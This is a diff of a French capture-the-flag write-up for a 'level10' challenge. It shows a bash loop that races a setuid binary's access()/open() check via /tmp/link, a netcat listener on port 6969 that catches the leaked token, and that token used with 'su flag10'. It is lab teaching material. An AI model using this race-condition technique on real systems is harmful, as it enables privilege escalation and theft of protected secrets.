@@ -39,20 +39,24 @@ L'usage nous indique que le binaire envoi un fichier, mais uniquement si on poss
 En regardant du côté de la commande `strings level10` :
 
 ```
+...
 Connecting to %s:6969 ..
+...
 open
+...
 access
+...
 ```
 
 On remarque que le programme se connecte sur le port `:6969` et utilise `open` et `access`. Nous pouvons dés lors, profiter d'une faille d'access afin d'y récupérer le token (man access).\
 Pour ce faire nous allons utiliser 2 scripts :
 
-- 1er script - Qui va essayer d'envoyer le fichier /tmp/link sur le localhost
+- 1er script - Qui va essayer d'envoyer le fichier /tmp/link sur le localhost (ici `192.168.56.101`)
 ```
 #!/bin/bash
 while true;
 do
-	~/level10 /tmp/link 127.0.0.1
+	~/level10 /tmp/link 192.168.56.101
 done
 ```
 
@@ -71,19 +75,19 @@ Il ne nous reste plus qu'à écouter les transfert avec la commande netcat `nc -
 
 ```
 :~$ nc -lk 6969
-
 ...
-
 .*( )*.
 woupa2yuojeeaaed06riuj63c
-```
+.*( )*.
+^C
 
+```
 
 Il nous suffit maintenant de nous connecter sur l'user `flag10` avec le résultat obtenu puis de lancer un `getflag`
 
 ```
 :~$ su flag10
-Password:
+Password:woupa2yuojeeaaed06riuj63c
 Don't forget to launch getflag !
 
 :~$ getflag
